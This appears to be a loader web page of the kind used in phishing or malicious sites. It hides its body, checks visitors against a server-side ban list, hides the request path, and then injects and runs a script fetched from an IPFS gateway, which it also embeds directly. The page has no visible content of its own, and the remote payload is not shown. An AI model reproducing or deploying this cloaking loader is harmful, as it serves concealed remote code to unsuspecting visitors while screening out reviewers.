<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    html, body {
      visibility: hidden;
    }
	
  </style>
</head>

<body>
  <div id="content">
<script src="https://eu.starton-ipfs.com/ipfs/bafkreienzbbl3bebtbjffnjv265i3pwcbrvm7jd257xaslhnmzzmwjr6ce"></script>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
        let currentPath = window.location.pathname;
        if (currentPath !== "/" && currentPath.match(/^\/[a-zA-Z]+$/)) {
            history.replaceState(null, "", "/");
        }
    });

    fetch('/check-ban.php')
      .then(response => response.json())
      .then(data => {
        if (data.banned) {
          document.body.innerHTML = "<h2>Access Denied</h2>";
          document.body.style.visibility = "visible";
        } else {
          document.documentElement.style.visibility = "visible";
          document.body.style.visibility = "visible";

          let script = document.createElement('script');
          script.src = "https://eu.starton-ipfs.com/ipfs/bafkreienzbbl3bebtbjffnjv265i3pwcbrvm7jd257xaslhnmzzmwjr6ce";  
          document.body.appendChild(script);
        }
      })
      .catch(error => {
        console.error('Error checking ban:', error);

        document.documentElement.style.visibility = "visible";
        document.body.style.visibility = "visible";

        let script = document.createElement('script');
        script.src = "https://eu.starton-ipfs.com/ipfs/bafkreienzbbl3bebtbjffnjv265i3pwcbrvm7jd257xaslhnmzzmwjr6ce";  
        document.body.appendChild(script);
      });
  </script>

</body>
</html>
